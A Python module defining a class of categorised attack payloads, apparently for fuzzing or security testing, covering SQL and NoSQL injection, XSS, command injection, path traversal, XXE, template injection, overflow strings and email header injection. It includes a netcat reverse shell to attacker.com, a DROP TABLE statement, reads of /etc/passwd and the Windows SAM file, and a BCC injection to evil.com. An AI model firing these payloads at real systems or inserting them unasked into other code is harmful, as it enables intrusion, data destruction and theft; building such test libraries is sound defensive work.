"""
Attack Payload Library
Contains various attack patterns for different vulnerability types
"""

class AttackPayloads:
    """Collection of attack payloads organized by category"""
    
    # SQL Injection Payloads
    SQL_INJECTION = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "admin'--",
        "admin' #",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "'; DROP TABLE users--",
        "' OR 1=1--",
        "') OR ('1'='1",
        "' WAITFOR DELAY '00:00:05'--",
    ]
    
    # NoSQL Injection
    NOSQL_INJECTION = [
        "{'$gt': ''}",
        "{'$ne': null}",
        "{'$regex': '.*'}",
        "admin' || '1'=='1",
        "{username: {$gt: ''}}",
    ]
    
    # XSS (Cross-Site Scripting)
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'\"><script>alert(String.fromCharCode(88,83,83))</script>",
    ]
    
    # Command Injection
    COMMAND_INJECTION = [
        "; ls -la",
        "| whoami",
        "&& cat /etc/passwd",
        "`id`",
        "$(whoami)",
        "; ping -c 10 127.0.0.1",
        "| nc -e /bin/sh attacker.com 4444",
    ]
    
    # Path Traversal
    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "../../../../../../../../../../etc/passwd",
    ]
    
    # LDAP Injection
    LDAP_INJECTION = [
        "*",
        "*)(&",
        "*)(|(objectClass=*",
        "admin)(&(password=*))",
    ]
    
    # XML Injection / XXE
    XML_INJECTION = [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<![CDATA[<script>alert('XSS')</script>]]>",
    ]
    
    # Template Injection
    TEMPLATE_INJECTION = [
        "{{7*7}}",
        "${7*7}",
        "{{config}}",
        "{{self}}",
        "<%= 7*7 %>",
        "${T(java.lang.Runtime).getRuntime().exec('calc')}",
    ]
    
    # Buffer Overflow / Format String
    BUFFER_OVERFLOW = [
        "A" * 1000,
        "A" * 5000,
        "A" * 10000,
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
    ]
    
    # Special Characters (encoding/parsing issues)
    SPECIAL_CHARS = [
        "\x00",  # Null byte
        "\n\r",  # CRLF
        "../../",
        "{{",
        "}}",
        "${",
        "\x7f",  # DEL character
        "\\x00",
        "\u0000",
    ]
    
    # Type Confusion
    TYPE_CONFUSION = [
        None,
        True,
        False,
        [],
        {},
        0,
        -1,
        9999999999999999,
        "null",
        "undefined",
        "NaN",
    ]
    
    # Integer Overflow/Underflow
    INTEGER_ATTACKS = [
        0,
        -1,
        -2147483648,  # Min int32
        2147483647,   # Max int32
        -9223372036854775808,  # Min int64
        9223372036854775807,   # Max int64
        999999999999999999,
    ]
    
    # Email-specific attacks
    EMAIL_ATTACKS = [
        "test@example.com\nBCC:attacker@evil.com",
        "test+<script>alert('xss')</script>@example.com",
        "test@evil.com%00@example.com",
        "\"test@test\"@example.com",
    ]
    
    @classmethod
    def get_all_categories(cls):
        """Return all attack categories"""
        return {
            'sql_injection': cls.SQL_INJECTION,
            'nosql_injection': cls.NOSQL_INJECTION,
            'xss': cls.XSS_PAYLOADS,
            'command_injection': cls.COMMAND_INJECTION,
            'path_traversal': cls.PATH_TRAVERSAL,
            'ldap_injection': cls.LDAP_INJECTION,
            'xml_injection': cls.XML_INJECTION,
            'template_injection': cls.TEMPLATE_INJECTION,
            'buffer_overflow': cls.BUFFER_OVERFLOW,
            'special_chars': cls.SPECIAL_CHARS,
            'type_confusion': cls.TYPE_CONFUSION,
            'integer_attacks': cls.INTEGER_ATTACKS,
            'email_attacks': cls.EMAIL_ATTACKS,
        }